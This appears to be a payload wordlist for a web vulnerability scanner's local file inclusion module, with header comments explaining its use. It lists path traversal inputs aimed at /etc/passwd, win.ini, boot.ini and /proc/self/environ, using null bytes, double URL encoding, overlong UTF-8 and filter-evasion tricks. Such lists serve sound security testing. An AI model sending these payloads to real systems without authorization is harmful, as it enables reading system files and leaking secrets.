# Payloads for the lfi module (files/fuzz-db/lfi_paths.lst).
# One payload per line, sent as the parameter value. Every payload must end in a
# file the scanner recognises by content (etc/passwd, windows/win.ini, boot.ini,
# proc/self/environ, proc/self/status, proc/version); lines aiming elsewhere are
# skipped, because a read of an unknown file cannot be proven. Lines containing
# %XX escapes are sent as written (not encoded again).

# absolute paths
/etc/passwd
file:///etc/passwd
/etc/passwd%00
C:\Windows\win.ini
C:/Windows/win.ini
file:///C:/Windows/win.ini
C:\boot.ini

# plain traversal
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd%00
../../../../../../../../../../etc/passwd%00.html
/../../../../../../../../../../etc/passwd

# filters that strip ../ once, require a prefix dir, or decode twice
....//....//....//....//....//....//....//....//....//....//etc/passwd
..././..././..././..././..././..././..././..././..././..././etc/passwd
./../../../../../../../../../../etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd

# windows
..\..\..\..\..\..\..\..\..\..\windows\win.ini
../../../../../../../../../../windows/win.ini
..\..\..\..\..\..\..\..\..\..\windows\win.ini%00
....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\windows\win.ini
..\..\..\..\..\..\..\..\..\..\boot.ini

# procfs
/proc/self/environ
../../../../../../../../../../proc/self/environ
../../../../../../../../../../proc/self/environ%00
/proc/self/status
../../../../../../../../../../proc/self/status
/proc/version
../../../../../../../../../../proc/version
